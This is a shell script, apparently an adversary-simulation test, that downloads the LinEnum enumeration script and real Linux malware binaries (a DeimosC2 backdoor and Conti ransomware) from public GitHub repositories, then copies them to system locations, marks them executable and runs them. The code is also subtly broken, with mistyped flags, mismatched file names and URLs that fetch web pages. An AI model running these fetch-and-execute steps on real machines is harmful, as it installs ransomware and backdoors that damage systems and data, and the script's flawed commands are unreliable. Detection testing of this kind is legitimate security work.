#!/bin/sh

# SENARIO --- Script Activity /enumeration 
# Step 1: Set Up Environment Variables and Directories
export 
DOWNLOAD_DIR="/tmp/"

# Step 2: Download Enumeration Script using wget or curl
if command -v wget >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using wget..."
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O $DOWNLOAD_DIR/enum_script.sh
elif command -v curl >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using curl..."
  curl -o $DOWNLOAD_DIR/enum_script.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
else
  echo "[-] Neither wget nor curl is available. Exiting."
  exit 1
fi
sleep 1

# Step 2: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod +x $DOWNLOAD_DIR/enum_script.sh
sleep 10


# Step 3: Run the Enumeration Script in a Docker Container
echo "[+] Running the enumeration script in a Docker container..."
sh $DOWNLOAD_DIR/enum_script.sh
sleep 3

# SENARIO -- WILDFIRE LOCAL ANALYSIS 
# Step 2: Download Sample Files from WildFire for Testing Purposes
# echo "[+] Downloading WildFire test samples..."
# for sample in pe apk macos elf; do
#  if command -v wget >/dev/null 2>&1; then
#    wget https://wildfire.paloaltonetworks.com/publicapi/test/${sample} -O $DOWNLOAD_DIR/${sample}_sample
#  elif command -v curl >/dev/null 2>&1; then
#    curl -o $DOWNLOAD_DIR/${sample}_sample https://wildfire.paloaltonetworks.com/publicapi/test/${sample}
#  fi;
#sleep 7 

# Step 3: Make the Downloaded Samples Executable
#echo "[+] Making the downloaded samples executable..."
#chmod +x $DOWNLOAD_DIR/*_sample

# SENARIO --- LINUX MALWARE 
# STEP 1 -- Ransomware, Back Door, Conti 
echo "[+] Downloading C2 and Ransomware samples..."
# Step 1 - Unix Backdoor Senario 
if command -v wget >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using wget..."
  wget https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O $DOWNLOAD_DIR/enum_script.sh
elif command -v curl >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using curl..."
  curl https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -0 $DOWNLOAD_DIR/unixbacdoor.elf
else
  echo "[-] Neither wget nor curl is available. Exiting."
  exit 1
fi
sleep 5

# Create Copies 
cat $DOWNLOAD_DIR/unixbacdoor.elf > /loader.sh
cp $DOWNLOAD_DIR/unixbacdoor.elf ~
cp $DOWNLOAD_DIR/unixbacdoor.elf ~/usr/share/
# make executaable
chmod +x $DOWNLOAD_DIR/unixbackdoor.elf
# execute 
sh unixbackdoor.elf

# Step 2 - Conti
if command -v wget >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using wget..."
  wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -O $DOWNLOAD_DIR/conti.sh
elif command -v curl >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using curl..."
  curl https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64 -0 $DOWNLOAD_DIR/conti.sh
else
  echo "[-] Neither wget nor curl is available. Exiting."
  exit 1
fi
sleep 5

# Make Executable 
chmod +x $DOWNLOAD_DIR/conti.sh
sleep 7
#copy and execute 
cp $DOWNLOAD_DIR/conti.sh /media/video.sh | sh

# Step 3 - c2 
if command -v wget >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using wget..."
  wget https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64 -O $DOWNLOAD_DIR/c2.sh
elif command -v curl >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using curl..."
  curl https://raw.githubusercontent.com/timb-machine/linux-malware/refs/heads/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64-0 $DOWNLOAD_DIR/c2.sh
else
  echo "[-] Neither wget nor curl is available. Exiting."
  exit 1
fi
sleep 5

# Make Executable 
chmod +x $DOWNLOAD_DIR/c2.sh
sleep 7

exit 0